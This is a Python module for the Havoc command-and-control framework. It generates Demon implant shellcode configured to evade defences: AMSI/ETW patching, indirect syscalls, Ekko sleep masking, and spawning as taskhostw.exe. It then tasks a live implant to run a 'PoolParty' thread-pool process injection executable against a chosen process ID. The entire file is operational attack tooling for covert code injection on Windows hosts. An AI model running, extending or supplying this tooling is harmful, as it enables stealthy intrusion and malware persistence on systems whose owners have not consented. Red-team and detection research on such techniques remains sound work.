#!/usr/bin/env python
#Author : Cipher007

from havoc import Demon, RegisterCommand, RegisterModule
import havoc
import os
from base64 import b64decode, b64encode
from time import sleep


#cwd = os.getcwd()
cwd = "/home/cipher/Github/havoc-PoolParty"
shellcode_file_path = cwd + "/payload.bin"
poolparty_file_path = cwd + "/PoolParty.exe"
variant = "8"
pid = ""

def generate_payload(demon, arch, listener):
	if os.path.exists(shellcode_file_path):
		os.remove(shellcode_file_path)
	if os.path.exists(poolparty_file_path):
		os.remove(poolparty_file_path)

	demon.ConsoleWrite(demon.CONSOLE_INFO, "Generating shellcode")
	arch = str(arch)
	listener = str(listener)
	havoc.GeneratePayload(save_shellcode,
            "Demon",
            listener,
            arch,
            "Windows Shellcode",
            "{ \
                \"Amsi/Etw Patch\": \"Hardware breakpoints\", \
                \"Indirect Syscall\": true,  \
                \"Sleep Jmp Gadget\": \"None\",  \
                \"Injection\": { \
                    \"Alloc\": \"Native/Syscall\", \
                    \"Execute\": \"Native/Syscall\", \
                    \"Spawn32\": \"C:\\\\Windows\\\\SysWOW64\\\\taskhostw.exe\", \
                    \"Spawn64\": \"C:\\\\Windows\\\\System32\\\\taskhostw.exe\" \
                }, \
                \"Jitter\": \"15\", \
                \"Proxy Loading\": \"RtlQueueWorkItem\", \
                \"Sleep\": \"17\", \
                \"Sleep Technique\": \"Ekko\", \
                \"Stack Duplication\": true \
            }"
        )
	return True

def generate(demonID, *params):
	TaskID : str = None
	demon : Demon = None
	demon = Demon(demonID)

	arch = ""
	listener = ""

	num_params = len(params)
	listeners = havoc.GetListeners()

	if num_params != 4 or params[0] == 'help' or params[0] == '-h':
		demon.ConsoleWrite(demon.CONSOLE_INFO, "USAGE : ")
		demon.ConsoleWrite(demon.CONSOLE_INFO, "		poolparty generate -a {x86/x64} -l {listener name}\n")
		demon.ConsoleWrite(demon.CONSOLE_INFO, 'AVAILABLE LISTENERS : ')
		if len(listeners) == 0:
			demon.ConsoleWrite(demon.CONSOLE_ERROR, "No Listeners Running!!!")
		else:
			for listen in listeners:
				demon.ConsoleWrite(demon.CONSOLE_INFO, f'-   {listen}')
		return False
	
	elif params[1] != 'x86' and params[1] != 'x64':
		demon.ConsoleWrite(demon.CONSOLE_ERROR, "Please select either x86 or x64 as your shellcode")
		return False

	else:
		arch = params[1]
		listener = params[3]
		demon.ConsoleWrite(demon.CONSOLE_INFO, f"{arch} - {listener}")
		if listener not in listeners:
			demon.ConsoleWrite(demon.CONSOLE_ERROR, "Listener is Invalid!")
			demon.ConsoleWrite(demon.CONSOLE_INFO, 'AVAILABLE LISTENERS : ')
			for listen in listeners:
				demon.ConsoleWrite(demon.CONSOLE_INFO, f'-   {listen}')
			return False

		else:
			demon.ConsoleWrite(demon.CONSOLE_INFO, f"Generating payload for {arch} with listener as {listener}")
	
			TaskID = generate_payload(demon, arch, listener)
			# demon.ConsoleWrite(demon.CONSOLE_INFO, "Generating PoolParty.exe file with new shellcode")
			
			# demon.ConsoleWrite(demon.CONSOLE_INFO, "PoolParty ready to use!")
			return TaskID
	

def execute(demon):
	global variant
	global pid
	demon.ConsoleWrite( demon.CONSOLE_INFO, "Tasked demon to run PoolParty with variant %s on PID %s" % (variant,pid) )
	query = f"-V {variant} -P {pid}"
	
	demon.Command(TaskID, "dotnet inline-execute %s %s" % (poolparty_file_path,query))

def save_shellcode(data):
	with open(shellcode_file_path, "wb") as file:
		file.write(b64decode(data))
	file.close()
	os.system(f"python3 {cwd}/generate.py -f {shellcode_file_path} ")

def run_parse_params(demon, params):
	global variant
	global pid

	num_params = len(params)
	
	skip = False

	if num_params != 4:
		demon.ConsoleWrite(demon.CONSOLE_ERROR,"USAGE:  poolparty run -V {1/2/3/4/5/6/7/8} -P {PID}")
		return False

	for i in range(num_params):
		if skip:
			skip = False
			continue

		param = params[i]

		if param == '-V' or param == '-v':
			skip = True
			if i+1 >= num_params:
				demon.ConsoleWrite( demon.CONSOLE_ERROR, "missing variant value (-v {1/2/3/4/5/6/7/8})" )
				return False
			variant = params[i+1]

		elif param == '-P' or param == '-p':
			skip = True
			if i+1 >= num_params:
				demon.ConsoleWrite( demon.CONSOLE_ERROR, "missing PID (-P {PID})" )
				return False
			pid = params[i+1]

		elif param == '-h' or param == "help":
			demon.ConsoleWrite(demon.CONSOLE_INFO,"USAGE:  poolparty run -V {1/2/3/4/5/6/7/8} -P {PID}")
			demon.ConsoleWrite(demon.CONSOLE_INFO,"\n")
			demon.ConsoleWrite(demon.CONSOLE_INFO,"VARIANT   -    DESCRIPTION")

		else:
			demon.ConsoleWrite(demon.CONSOLE_ERROR,"USAGE:  poolparty run -V {1/2/3/4/5/6/7/8} -P {PID}")

	execute(demon)
	return True

def run(demonID, *params):
	TaskID : str = None
	demon : Demon = None
	demon = Demon(demonID)

	if not os.path.exists(poolparty_file_path):
		demon.ConsoleWrite(demon.CONSOLE_ERROR, "Please generate the PoolParty payload first!")
		return False

	
	TaskID = run_parse_params(demon, params)

	return TaskID


RegisterModule("poolparty", "Windows Thread Pool Injection Module", "", "", "", "")
RegisterCommand(generate, "poolparty", "generate", "Generate the PoolParty executable",0, "", "")
RegisterCommand(run, "poolparty", "run", "Run the PoolParty process injection", 0, "", "")